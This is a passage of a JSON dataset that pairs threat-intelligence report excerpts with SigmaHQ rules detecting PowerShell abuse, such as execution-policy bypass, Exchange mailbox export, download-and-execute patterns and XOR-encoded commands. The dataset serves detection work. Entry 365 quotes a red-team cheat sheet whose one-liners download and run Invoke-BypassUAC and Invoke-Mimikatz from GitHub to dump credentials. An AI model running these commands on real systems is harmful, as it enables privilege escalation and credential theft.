      "description": "Detects changing the PowerShell script execution policy to a potentially insecure level using the \"-ExecutionPolicy\" flag.",
      "references": [
        "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4",
        "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4",
        "https://adsecurity.org/?p=2604",
        "https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/"
      ],
      "author": "frack113",
      "date": "2021-11-01",
      "modified": "2023-12-13",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          },
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          }
        ],
        "selection_option": {
          "CommandLine|contains": [
            "-executionpolicy ",
            " -ep ",
            " -exec "
          ]
        },
        "selection_level": {
          "CommandLine|contains": [
            "Bypass",
            "Unrestricted"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Administrator scripts"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_set_policies_to_unsecure_level.yml"
  },
  "361": {
    "url": "https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/",
    "markdown": "# From Zero to Domain Admin **Categories:** cobaltstrike exploit hancitor **Published on:** November 1, 2021 ## Intro This report will go through an intrusion from July that began with an email, which included a link to Google’s Feed Proxy service that was used to download a malicious Word document. Upon the user enabling macros, a Hancitor dll was executed, which called the usual suspect, Cobalt Strike. Various different enumeration and lateral movement tactics were observed on the network, along with the exploitation of Zerologon to elevate to domain administrator and gain full control over the domain. The threat actor was",
    "sigma_rule": {
      "title": "Change PowerShell Policies to an Insecure Level",
      "id": "87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180",
      "related": [
        {
          "id": "cf2e938e-9a3e-4fe8-a347-411642b28a9f",
          "type": "similar"
        },
        {
          "id": "61d0475c-173f-4844-86f7-f3eebae1c66b",
          "type": "similar"
        },
        {
          "id": "fad91067-08c5-4d1a-8d8c-d96a21b37814",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changing the PowerShell script execution policy to a potentially insecure level using the \"-ExecutionPolicy\" flag.",
      "references": [
        "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4",
        "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4",
        "https://adsecurity.org/?p=2604",
        "https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/"
      ],
      "author": "frack113",
      "date": "2021-11-01",
      "modified": "2023-12-13",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          },
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          }
        ],
        "selection_option": {
          "CommandLine|contains": [
            "-executionpolicy ",
            " -ep ",
            " -exec "
          ]
        },
        "selection_level": {
          "CommandLine|contains": [
            "Bypass",
            "Unrestricted"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Administrator scripts"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_set_policies_to_unsecure_level.yml"
  },
  "362": {
    "url": "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/",
    "markdown": "# Operation Exchange Marauder: Active Exploitation of Multiple Zero-Day Microsoft Exchange Vulnerabilities **March 2, 2021** ```image Alt: MS Exchange graphic banner Description: The image features a visual banner titled \"Active Exploitation of Multiple Zero-Day Microsoft Exchange Vulnerabilities\" with a background of circuit patterns, suggesting a technological theme. It includes key bullet points summarizing the vulnerabilities: 'Pre-auth RCE and auth bypass against Microsoft Exchange servers,' 'Leveraged by nation-state APT threat actors to steal e-mail,' and 'Webshells deployed to numerous organizations for persistent access.' Additionally, it has an illustration of the Microsoft Exchange logo with envelopes, indicating the focus on email security.",
    "sigma_rule": {
      "title": "Exchange PowerShell Snap-Ins Usage",
      "id": "25676e10-2121-446e-80a4-71ff8506af47",
      "status": "test",
      "description": "Detects adding and using Exchange PowerShell snap-ins to export mailbox data. As seen used by HAFNIUM and APT27",
      "references": [
        "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/",
        "https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",
        "https://www.intrinsec.com/apt27-analysis/"
      ],
      "author": "FPT.EagleEye, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-03-03",
      "modified": "2023-03-24",
      "tags": [
        "attack.execution",
        "attack.t1059.001",
        "attack.collection",
        "attack.t1114"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "Add-PSSnapin"
        },
        "selection_module": {
          "CommandLine|contains": [
            "Microsoft.Exchange.Powershell.Snapin",
            "Microsoft.Exchange.Management.PowerShell.SnapIn"
          ]
        },
        "filter_msiexec": {
          "ParentImage": "C:\\Windows\\System32\\msiexec.exe",
          "CommandLine|contains": "$exserver=Get-ExchangeServer ([Environment]::MachineName) -ErrorVariable exerr 2> $null"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_snapins_hafnium.yml"
  },
  "363": {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",
    "markdown": "# HAFNIUM targeting Exchange Servers with 0-day exploits **Published**: March 2, 2021 ## Updates **Update [03/16/2021]**: Microsoft released updated tools and investigation guidance to help IT Pros and incident response teams identify, remediate, defend against associated attacks: Guidance for responders: Investigating and remediating on-premises Exchange Server vulnerabilities. **Update [03/15/2021]**: Microsoft released a new one-click mitigation tool, the Microsoft Exchange On-Premises Mitigation Tool, to help customers who do not have dedicated security or IT teams to apply security updates for Microsoft Exchange Server. **Update [03/08/2021]**: Microsoft continues to see multiple actors taking advantage of unpatched systems to attack organizations with on-premises",
    "sigma_rule": {
      "title": "Exchange PowerShell Snap-Ins Usage",
      "id": "25676e10-2121-446e-80a4-71ff8506af47",
      "status": "test",
      "description": "Detects adding and using Exchange PowerShell snap-ins to export mailbox data. As seen used by HAFNIUM and APT27",
      "references": [
        "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/",
        "https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",
        "https://www.intrinsec.com/apt27-analysis/"
      ],
      "author": "FPT.EagleEye, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-03-03",
      "modified": "2023-03-24",
      "tags": [
        "attack.execution",
        "attack.t1059.001",
        "attack.collection",
        "attack.t1114"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "Add-PSSnapin"
        },
        "selection_module": {
          "CommandLine|contains": [
            "Microsoft.Exchange.Powershell.Snapin",
            "Microsoft.Exchange.Management.PowerShell.SnapIn"
          ]
        },
        "filter_msiexec": {
          "ParentImage": "C:\\Windows\\System32\\msiexec.exe",
          "CommandLine|contains": "$exserver=Get-ExchangeServer ([Environment]::MachineName) -ErrorVariable exerr 2> $null"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_snapins_hafnium.yml"
  },
  "364": {
    "url": "https://www.intrinsec.com/apt27-analysis/",
    "markdown": "# APT27 – One Year To Exfiltrate Them All: Intrusion In-Depth Analysis **par** Equipe CERT | Oct 18, 2022 | CERT, Cyber Threat Intelligence ## Context During 2022, a company discovered that one of their equipments was communicating with a known command and control server. As a result, the company decided to contact CERT Intrinsec in order to get help to handle the security breach and manage the crisis. CERT Intrinsec gathered information about malicious activities that were discovered on victim’s information system, and past incidents. Our in-depth analysis led us to conclude that an advanced persistent threat dubbed APT27",
    "sigma_rule": {
      "title": "Exchange PowerShell Snap-Ins Usage",
      "id": "25676e10-2121-446e-80a4-71ff8506af47",
      "status": "test",
      "description": "Detects adding and using Exchange PowerShell snap-ins to export mailbox data. As seen used by HAFNIUM and APT27",
      "references": [
        "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/",
        "https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",
        "https://www.intrinsec.com/apt27-analysis/"
      ],
      "author": "FPT.EagleEye, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-03-03",
      "modified": "2023-03-24",
      "tags": [
        "attack.execution",
        "attack.t1059.001",
        "attack.collection",
        "attack.t1114"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "Add-PSSnapin"
        },
        "selection_module": {
          "CommandLine|contains": [
            "Microsoft.Exchange.Powershell.Snapin",
            "Microsoft.Exchange.Management.PowerShell.SnapIn"
          ]
        },
        "filter_msiexec": {
          "ParentImage": "C:\\Windows\\System32\\msiexec.exe",
          "CommandLine|contains": "$exserver=Get-ExchangeServer ([Environment]::MachineName) -ErrorVariable exerr 2> $null"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_snapins_hafnium.yml"
  },
  "365": {
    "url": "https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70",
    "markdown": "# RedTeam_CheatSheet.ps1 ## Description: Collection of PowerShell one-liners for red teamers and penetration testers to use at various stages of testing. ### Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command] ``` powershell.exe -exec bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'\" ``` ### Invoke-Mimikatz: Dump credentials from memory ``` powershell.exe -exec bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds\" ``` ### Import Mimikatz Module to run further commands ``` powershell.exe -exec Bypass -noexit -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\" ``` ### Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)] ``` powershell.exe -exec",
    "sigma_rule": {
      "title": "Suspicious PowerShell Download and Execute Pattern",
      "id": "e6c54d94-498c-4562-a37c-b469d8e9a275",
      "related": [
        {
          "id": "3b6ab547-8ec2-4991-b9d2-2b06702a48d7",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)",
      "references": [
        "https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70",
        "https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-28",
      "modified": "2022-03-01",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "IEX ((New-Object Net.WebClient).DownloadString",
            "IEX (New-Object Net.WebClient).DownloadString",
            "IEX((New-Object Net.WebClient).DownloadString",
            "IEX(New-Object Net.WebClient).DownloadString",
            " -command (New-Object System.Net.WebClient).DownloadFile(",
            " -c (New-Object System.Net.WebClient).DownloadFile("
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Software installers that pull packages from remote systems and execute them"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_susp_download_patterns.yml"
  },
  "366": {
    "url": "https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html",
    "markdown": "# LV Ransomware Exploits ProxyShell in Attack on a Jordan-based Company Our blog entry provides a look at an attack involving the LV ransomware on a Jordan-based company from an intrusion analysis standpoint. **Date:** October 25, 2022 ## Overview The Trend Micro research team recently analyzed an infection related to the LV ransomware group, a ransomware as a service (RaaS) operation that has been active since late 2020, and is reportedly based on REvil (aka Sodinokibi). The exact nature of the relationship between the LV ransomware and REvil groups cannot be definitively established or verified — the LV ransomware’s developers",
    "sigma_rule": {
      "title": "Suspicious PowerShell Download and Execute Pattern",
      "id": "e6c54d94-498c-4562-a37c-b469d8e9a275",
      "related": [
        {
          "id": "3b6ab547-8ec2-4991-b9d2-2b06702a48d7",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)",
      "references": [
        "https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70",
        "https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-28",
      "modified": "2022-03-01",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "IEX ((New-Object Net.WebClient).DownloadString",
            "IEX (New-Object Net.WebClient).DownloadString",
            "IEX((New-Object Net.WebClient).DownloadString",
            "IEX(New-Object Net.WebClient).DownloadString",
            " -command (New-Object System.Net.WebClient).DownloadFile(",
            " -c (New-Object System.Net.WebClient).DownloadFile("
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Software installers that pull packages from remote systems and execute them"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_susp_download_patterns.yml"
  },
  "367": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/apt41-initiates-global-intrusion-campaign-using-multiple-exploits/",
    "markdown": "# This Is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple Exploits **March 25, 2020** --- ### Written by: Christopher Glyer, Dan Perez, Sarah Jones, Steve Miller --- Beginning this year, FireEye observed Chinese actor APT41 carry out one of the broadest campaigns by a Chinese cyber espionage actor we have observed in recent years. Between January 20 and March 11, FireEye observed APT41 attempt to exploit vulnerabilities in Citrix NetScaler/ADC, Cisco routers, and Zoho ManageEngine Desktop Central at over 75 FireEye customers. Countries targeted include Australia, Canada, Denmark, Finland, France, India, Italy, Japan, Malaysia, Mexico, Philippines, Poland,",
    "sigma_rule": {
      "title": "PowerShell DownloadFile",
      "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
      "status": "test",
      "description": "Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/apt41-initiates-global-intrusion-campaign-using-multiple-exploits/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2020-08-28",
      "modified": "2021-11-27",
      "tags": [
        "attack.execution",
        "attack.t1059.001",
        "attack.command-and-control",
        "attack.t1104",
        "attack.t1105"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "powershell",
            ".DownloadFile",
            "System.Net.WebClient"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_susp_ps_downloadfile.yml"
  },
  "368": {
    "url": "https://blog.talosintelligence.com/lazarus-three-rats/",
    "markdown": "# Lazarus and the tale of three RATs **Thursday, September 8, 2022 08:01** Threat Spotlight - Cisco Talos has been tracking a new campaign operated by the Lazarus APT group, attributed to North Korea by the United States government. - This campaign involved the exploitation of vulnerabilities in VMWare Horizon to gain an initial foothold into targeted organizations. - Targeted organizations include energy providers from around the world, including those headquartered in the United States, Canada, and Japan. - The campaign is meant to infiltrate organizations around the world for establishing long-term access and subsequently exfiltrating data of interest to",
    "sigma_rule": {
      "title": "User Discovery And Export Via Get-ADUser Cmdlet",
      "id": "1114e048-b69c-4f41-bc20-657245ae6e3f",
      "related": [
        {
          "id": "c2993223-6da8-4b1a-88ee-668b8bf315e9",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of the Get-ADUser cmdlet to collect user information and output it to a file",
      "references": [
        "https://blog.talosintelligence.com/lazarus-three-rats/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "modified": "2022-11-17",
      "tags": [
        "attack.discovery",
        "attack.t1033"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "Get-ADUser ",
            " -Filter \\*"
          ],
          "CommandLine|contains": [
            " > ",
            " | Select ",
            "Out-File",
            "Set-Content",
            "Add-Content"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate admin scripts may use the same technique, it's better to exclude specific computers or users who execute these commands or scripts often"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_user_discovery_get_aduser.yml"
  },
  "369": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/",
    "markdown": "# Defenders beware: A case for post-ransomware investigations **October 18, 2022** Ransomware is one of the most pervasive threats that Microsoft Detection and Response Team (DART) responds to today. The groups behind these attacks continue to add sophistication to their tactics, techniques, and procedures (TTPs) as most network security postures increase. In this blog, we detail a recent ransomware incident in which the attacker used a collection of commodity tools and techniques, such as using living-off-the-land binaries, to launch their malicious code. Cobalt Strike was used for persistence on the network with NT AUTHORITY/SYSTEM (local SYSTEM) privileges to maintain access",
    "sigma_rule": {
      "title": "User Discovery And Export Via Get-ADUser Cmdlet",
      "id": "1114e048-b69c-4f41-bc20-657245ae6e3f",
      "related": [
        {
          "id": "c2993223-6da8-4b1a-88ee-668b8bf315e9",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of the Get-ADUser cmdlet to collect user information and output it to a file",
      "references": [
        "https://blog.talosintelligence.com/lazarus-three-rats/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "modified": "2022-11-17",
      "tags": [
        "attack.discovery",
        "attack.t1033"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "Get-ADUser ",
            " -Filter \\*"
          ],
          "CommandLine|contains": [
            " > ",
            " | Select ",
            "Out-File",
            "Set-Content",
            "Add-Content"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate admin scripts may use the same technique, it's better to exclude specific computers or users who execute these commands or scripts often"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_user_discovery_get_aduser.yml"
  },
  "370": {
    "url": "https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious XOR Encoded PowerShell Command",
      "id": "bb780e0c-16cf-4383-8383-1e5471db6cf9",
      "related": [
        {
          "id": "5b572dcf-254b-425c-a8c5-d9af6bea35a6",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects presence of a potentially xor encoded powershell command",
      "references": [
        "https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65",
        "https://redcanary.com/blog/yellow-cockatoo/",
        "https://zero2auto.com/2020/05/19/netwalker-re/",
        "https://web.archive.org/web/20230304082026/https://mez0.cc/posts/cobaltstrike-powershell-exec/"
      ],
      "author": "Sami Ruohonen, Harish Segar, Tim Shelton, Teymur Kheirkhabarov, Vasiliy Burov, oscd.community, Nasreddine Bencherchali",
      "date": "2018-09-05",
      "modified": "2023-01-30",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1059.001",
        "attack.t1140",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          },
          {
            "Description": "Windows PowerShell"
          },
          {
            "Product": "PowerShell Core 6"
          }
        ],
        "selection_cli_xor": {
          "CommandLine|contains": "bxor"
        },
        "selection_cli_other": {
          "CommandLine|contains": [
            "ForEach",
            "for(",
            "for ",
            "-join ",
            "-join'",
            "-join\"",
            "-join`",
            "::Join",
            "[char]"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_xor_commandline.yml"
  },
  "371": {
    "url": "https://redcanary.com/blog/yellow-cockatoo/",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious XOR Encoded PowerShell Command",
      "id": "bb780e0c-16cf-4383-8383-1e5471db6cf9",
      "related": [
        {
          "id": "5b572dcf-254b-425c-a8c5-d9af6bea35a6",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects presence of a potentially xor encoded powershell command",
      "references": [
        "https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65",
        "https://redcanary.com/blog/yellow-cockatoo/",
        "https://zero2auto.com/2020/05/19/netwalker-re/",
        "https://web.archive.org/web/20230304082026/https://mez0.cc/posts/cobaltstrike-powershell-exec/"
      ],
      "author": "Sami Ruohonen, Harish Segar, Tim Shelton, Teymur Kheirkhabarov, Vasiliy Burov, oscd.community, Nasreddine Bencherchali",
      "date": "2018-09-05",
      "modified": "2023-01-30",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1059.001",
        "attack.t1140",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          },
          {
            "Description": "Windows PowerShell"
          },
          {
            "Product": "PowerShell Core 6"
          }
        ],
        "selection_cli_xor": {
          "CommandLine|contains": "bxor"
        },
        "selection_cli_other": {
          "CommandLine|contains": [
            "ForEach",
            "for(",
            "for ",
            "-join ",
            "-join'",
            "-join\"",
            "-join`",
            "::Join",
            "[char]"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_xor_commandline.yml"
  },
  "372": {
    "url": "https://zero2auto.com/2020/05/19/netwalker-re/",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious XOR Encoded PowerShell Command",
      "id": "bb780e0c-16cf-4383-8383-1e5471db6cf9",
      "related": [
        {
          "id": "5b572dcf-254b-425c-a8c5-d9af6bea35a6",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects presence of a potentially xor encoded powershell command",
      "references": [
        "https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65",
        "https://redcanary.com/blog/yellow-cockatoo/",
        "https://zero2auto.com/2020/05/19/netwalker-re/",
        "https://web.archive.org/web/20230304082026/https://mez0.cc/posts/cobaltstrike-powershell-exec/"
      ],
      "author": "Sami Ruohonen, Harish Segar, Tim Shelton, Teymur Kheirkhabarov, Vasiliy Burov, oscd.community, Nasreddine Bencherchali",
      "date": "2018-09-05",
      "modified": "2023-01-30",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1059.001",
        "attack.t1140",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          },
          {
            "Description": "Windows PowerShell"
          },
          {
            "Product": "PowerShell Core 6"
          }
        ],
        "selection_cli_xor": {
          "CommandLine|contains": "bxor"
        },
        "selection_cli_other": {
          "CommandLine|contains": [
            "ForEach",
            "for(",
            "for ",
            "-join ",
            "-join'",
            "-join\"",
            "-join`",
            "::Join",
            "[char]"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_xor_commandline.yml"
  },
  "373": {
    "url": "https://web.archive.org/web/20230304082026/https://mez0.cc/posts/cobaltstrike-powershell-exec/",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious XOR Encoded PowerShell Command",
      "id": "bb780e0c-16cf-4383-8383-1e5471db6cf9",
      "related": [
        {
          "id": "5b572dcf-254b-425c-a8c5-d9af6bea35a6",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects presence of a potentially xor encoded powershell command",
      "references": [
        "https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65",
        "https://redcanary.com/blog/yellow-cockatoo/",
        "https://zero2auto.com/2020/05/19/netwalker-re/",
        "https://web.archive.org/web/20230304082026/https://mez0.cc/posts/cobaltstrike-powershell-exec/"
      ],
      "author": "Sami Ruohonen, Harish Segar, Tim Shelton, Teymur Kheirkhabarov, Vasiliy Burov, oscd.community, Nasreddine Bencherchali",
      "date": "2018-09-05",
      "modified": "2023-01-30",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1059.001",
        "attack.t1140",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          },
          {
            "Description": "Windows PowerShell"
          },
          {
            "Product": "PowerShell Core 6"
          }
        ],
        "selection_cli_xor": {
          "CommandLine|contains": "bxor"
        },
        "selection_cli_other": {
          "CommandLine|contains": [
            "ForEach",
            "for(",
            "for ",
            "-join ",
            "-join'",
            "-join\"",
            "-join`",
            "::Join",
            "[char]"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_xor_commandline.yml"
  },
  "374": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md",
    "markdown": "# T1074.001 - Local Data Staging ## Description from ATT&CK > Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location. > > Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry. (Citation: Prevailion DarkWatchman 2021) ## Atomic",
    "sigma_rule": {
      "title": "Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet",
      "id": "85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98",
      "related": [
        {
